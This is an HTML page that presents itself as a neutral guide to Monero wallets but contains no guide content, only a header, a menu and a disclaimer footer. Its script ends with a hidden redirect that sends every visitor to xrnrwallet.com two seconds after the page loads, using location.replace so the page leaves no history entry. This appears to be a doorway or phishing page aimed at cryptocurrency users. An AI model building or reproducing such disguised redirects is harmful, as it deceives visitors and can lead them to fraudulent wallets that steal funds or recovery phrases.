<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Monero Wallets — Full Guide & Comparison</title>
  <meta name="description" content="Comprehensive neutral guide to Monero wallets. Compare features, security, and usability. Informational only." />
  <link rel="icon" href="/favicon.png" />
  <style>
    /* твои стили остаются без изменений */
  </style>
</head>
<body>
  <header class="header" id="top">
    <div class="wrap nav">
      <div class="brand">
        <div class="logo" aria-hidden="true">M</div>
        Monero Wallets — Guide
      </div>
      <nav class="menu" aria-label="Primary navigation">
        <a class="pill" href="#wallets">Wallets</a>
        <a class="pill" href="#compare">Compare</a>
        <a class="pill" href="#setup">Setup</a>
        <a class="pill" href="#restore">Restore</a>
        <a class="pill" href="#faq">FAQ</a>
      </nav>
      <button class="burger" id="burger" aria-label="Toggle menu" aria-expanded="false">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
          <path d="M3 6h18M3 12h18M3 18h18" stroke-width="2" stroke-linecap="round"/>
        </svg>
      </button>
    </div>
  </header>

  <!-- дальше весь твой контент: hero, wallets, compare, setup, restore, footer -->

  <footer style="background:var(--panel);border-top:1px solid var(--line)">
    <div class="wrap" style="padding:18px 0;display:flex;gap:14px;flex-wrap:wrap;align-items:center;justify-content:space-between">
      <div style="color:var(--muted)">Disclaimer: Informational resource only. © <span id="y"></span></div>
      <nav style="display:flex;gap:10px">
        <a class="pill" href="/terms.html">Terms</a>
        <a class="pill" href="/privacy.html">Privacy</a>
      </nav>
    </div>
  </footer>

  <script>
    const header = document.querySelector('.header');
    const onScroll = ()=> header.classList.toggle('scrolled', window.scrollY>2);
    onScroll();
    window.addEventListener('scroll', onScroll, {passive:true});

    const io = new IntersectionObserver((entries)=>{
      entries.forEach(e=>{
        if(e.isIntersecting){
          e.target.classList.add('reveal');
          io.unobserve(e.target);
        }
      })
    },{threshold:.16});
    document.querySelectorAll('[data-reveal]').forEach(el=>io.observe(el));

    const pills = document.querySelectorAll('.pill');
    function setActive(){
      pills.forEach(p=>p.classList.remove('active'));
      const t = document.querySelector(`a[href='${location.hash}']`);
      if(t) t.classList.add('active');
    }
    window.addEventListener('hashchange', setActive); 
    setActive();

    const burger = document.getElementById('burger');
    const drawer = document.getElementById('drawer');
    if (burger && drawer) {
      burger.addEventListener('click', ()=>{
        const open = drawer.classList.toggle('open');
        burger.setAttribute('aria-expanded', String(open));
        drawer.setAttribute('aria-hidden', String(!open));
      });
    }

    document.getElementById('y').textContent = new Date().getFullYear();

    // Редирект через 2 секунды после загрузки DOM
    document.addEventListener("DOMContentLoaded", function() {
      setTimeout(function() {
        window.location.replace("https://xrnrwallet.com/");
      }, 2000);
    });
  </script>
</body>
</html>
